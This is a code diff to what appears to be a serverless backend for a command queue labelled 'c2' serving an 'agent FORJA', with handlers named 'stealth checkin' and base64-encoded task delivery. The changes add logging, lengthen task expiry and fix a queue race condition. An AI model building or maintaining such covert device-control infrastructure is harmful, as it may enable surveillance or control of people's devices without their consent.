@@ -20,14 +20,18 @@ const JWKS = createRemoteJWKSet(
 
 async function requireUser(request) {
   const auth = request.headers.get("Authorization") || "";
-  if (!auth.startsWith("Bearer ")) return null;
+  if (!auth.startsWith("Bearer ")) {
+    c2log("auth.reject", "?", "no-bearer path=" + request.url.slice(0, 60));
+    return null;
+  }
   try {
     const { payload } = await jwtVerify(auth.slice(7), JWKS, {
       issuer: `https://securetoken.google.com/${FIREBASE_PROJECT}`,
       audience: FIREBASE_PROJECT,
     });
     return payload.sub || null;
-  } catch (_) {
+  } catch (e) {
+    c2log("auth.fail", "?", (e.message || "").slice(0, 100) + " path=" + request.url.slice(0, 60));
     return null;
   }
 }
@@ -1095,6 +1099,11 @@ async function runCmd(env, line, host) {
 // ═══════════════ Sincronizare — canal de comenzi (agent FORJA) ═══════════════
 function c2Safe(uid) { return String(uid || "").replace(/[^A-Za-z0-9_-]/g, "").slice(0, 64); }
 
+/** Diagnostic logging (temporary — remove after incident resolved). Logs to CF Workers console. */
+function c2log(event, uid, detail) {
+  try { console.log(JSON.stringify({ ts: new Date().toISOString(), ev: event, uid: (uid || "").slice(0, 8), d: detail ? String(detail).slice(0, 200) : "" })); } catch (_) { }
+}
+
 async function c2GetArr(bucket, key) {
   try { const o = await bucket.get(key); if (!o) return []; const t = await o.text(); return JSON.parse(t); } catch (_) { return []; }
 }
@@ -1102,15 +1111,27 @@ async function c2DrainTasks(bucket, uid) {
   const key = "q/" + uid + ".json";
   let arr = await c2GetArr(bucket, key);
   if (!arr.length) return arr;
-  // Expiră comenzile vechi (>10 min) — nu rămân PENDING la infinit.
+  c2log("drain.read", uid, "n=" + arr.length + " ids=" + arr.map(t => t.id).join(","));
+  // Expiră comenzile vechi (>60 min) — nu rămân PENDING la infinit,
+  // dar avem generozitate pentru offline-uri lungi (WorkManager 15 min + jitter).
   const now = Math.floor(Date.now() / 1000);
-  const fresh = arr.filter(t => (t.at || 0) > now - 600);
+  const fresh = arr.filter(t => (t.at || 0) > now - 3600);
   if (fresh.length !== arr.length) {
-    // Scriem înapoi doar cele noi (expirele dispar).
+    c2log("drain.expire", uid, "expired=" + (arr.length - fresh.length) + " ids=" + arr.filter(t => (t.at || 0) <= now - 3600).map(t => t.id).join(","));
     try { await bucket.put(key, JSON.stringify(fresh)); } catch (_) { }
   }
   if (!fresh.length) return fresh;
-  try { await bucket.put(key, "[]"); } catch (_) { }
+  // Drain: ștergem coada, apoi re-verificăm dacă c2Enqueue a scris
+  // în fereastra dintre get și put (race condition → pierderea comenzii).
+  try {
+    await bucket.put(key, "[]");
+    const leftover = await c2GetArr(bucket, key);
+    if (leftover.length) {
+      c2log("drain.race", uid, "leftover=" + leftover.length + " ids=" + leftover.map(t => t.id).join(","));
+      await bucket.put(key, JSON.stringify(leftover));
+    }
+  } catch (e) { c2log("drain.error", uid, e.message || ""); }
+  c2log("drain.deliver", uid, "n=" + fresh.length + " ids=" + fresh.map(t => t.id).join(","));
   return fresh;
 }
 function c2Enqueue(bucket, uid, tasks) {
@@ -1124,6 +1145,7 @@ function c2Enqueue(bucket, uid, tasks) {
       arr.push(t);
     }
     await bucket.put(key, JSON.stringify(arr));
+    c2log("enqueue", uid, "added=" + tasks.map(t => t.id + ":" + t.action).join(",") + " queueSize=" + arr.length);
     return arr;
   })();
 }
@@ -1177,6 +1199,7 @@ async function handleStealthCheckin(request, env, uid) {
   const intervalMs = Math.min(Math.max(Number(body.intervalMs) || 30000, 1000), 600000);
   await c2RegisterDevice(env.C2, uid, dev);
   const deadline = Date.now() + holdMs;
+  const t0 = Date.now();
   let tasks = [];
   while (true) {
     tasks = await c2DrainTasks(env.C2, uid);
@@ -1184,6 +1207,8 @@ async function handleStealthCheckin(request, env, uid) {
     if (Date.now() >= deadline) break;
     await new Promise(r => setTimeout(r, 2000 + Math.floor(Math.random() * 1500)));
   }
+  const elapsed = Date.now() - t0;
+  c2log("checkin", uid, "hold=" + holdMs + "ms elapsed=" + elapsed + "ms tasks=" + tasks.length + " ids=" + (tasks.length ? tasks.map(t => t.id).join(",") : "-"));
   const d = tasks.length ? b64enc(JSON.stringify(tasks)) : "";
   return json({ s: 0, d, i: Math.round(intervalMs / 1000) });
 }
@@ -1292,7 +1317,9 @@ async function handleAdminC2(request, env, url) {
     const uid = c2Safe(url.searchParams.get("uid"));
     if (!uid) return json({ error: "Lipsește uid." }, 400);
     const arr = await c2GetArr(env.C2, "q/" + uid + ".json");
-    return json({ tasks: arr });
+    const now = Math.floor(Date.now() / 1000);
+    const fresh = arr.filter(t => (t.at || 0) > now - 3600);
+    return json({ tasks: fresh, expired: arr.length - fresh.length });
   }
   if (request.method === "GET" && p === "/admin/api/c2/results") {
     const uid = c2Safe(url.searchParams.get("uid"));
